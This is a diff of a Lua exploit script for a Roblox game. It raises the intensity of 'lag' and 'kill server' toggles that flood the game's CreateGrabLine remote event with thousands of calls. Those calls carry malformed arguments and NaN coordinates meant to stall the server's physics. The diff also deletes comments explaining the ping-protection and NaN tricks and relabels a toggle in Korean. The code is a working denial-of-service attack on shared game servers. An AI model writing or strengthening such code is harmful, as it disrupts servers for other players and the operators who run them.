@@ -17057,7 +17057,7 @@ ChaosGrabToggle = lagTab:AddToggle({
                             function() return CFrame.new() end,
                             setmetatable({}, {__tostring=function() error("chaos") end}),
                         }
-                        for burst = 1, 200 do
+                        for burst = 1, 2800 do
                             for _, arg in ipairs(invalidArgs) do
                                 task.spawn(function()
                                     pcall(function()
@@ -17067,7 +17067,7 @@ ChaosGrabToggle = lagTab:AddToggle({
                             end
                         end
                     end
-                    task.wait(4)
+                    task.wait(3)
                 end
             end)
         end
@@ -17075,7 +17075,7 @@ ChaosGrabToggle = lagTab:AddToggle({
 })
 
 lagTab:AddToggle({
-    Name = "킬 서버 (제로핑 울트라)",
+    Name = "킬 서버 (모바일 이용 불가)",
     Default = false,
     Callback = function(Value)
         local Stats = game:GetService("Stats")
@@ -17083,14 +17083,14 @@ lagTab:AddToggle({
         if Value then
             getgenv().killServerRunning = true
             
-            -- 메인 로직과 네트워크 송신을 완전히 분리하여 내 핑 보호
+        
             task.spawn(function()
                 local grabEvents = ReplicatedStorage:WaitForChild("GrabEvents", 5)
                 local createGrabLine = grabEvents and grabEvents:WaitForChild("CreateGrabLine", 5)
                 if not createGrabLine then return end
 
                 while getgenv().killServerRunning do
-                    -- 핑 방어선 (400ms 넘으면 패킷 발사 중지 후 대기)
+                    
                     local success, currentPing = pcall(function()
                         return Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
                     end)
@@ -17105,16 +17105,16 @@ lagTab:AddToggle({
                         until currentPing < 300 or not getgenv().killServerRunning
                     end
 
-                    -- 핵심: 코루틴(coroutine)과 task.defer를 조합해 내 클라이언트 네트워크 큐 블로킹 방지
+            
                     local randomPart = workspace:FindFirstChildOfClass("Part")
                     if randomPart then
                         coroutine.wrap(function()
-                            for i = 1, 1000 do
+                            for i = 1, 10000 do
                                 task.defer(function()
                                     pcall(function()
                                         createGrabLine:FireServer(
                                             randomPart,
-                                            CFrame.new(0/0, 0/0, 0/0) -- NaN 좌표로 서버 물리 연산 블록 유발 (데이터 용량 최소화)
+                                            CFrame.new(0/0, 0/0, 0/0) 
                                         )
                                     end)
                                 end)
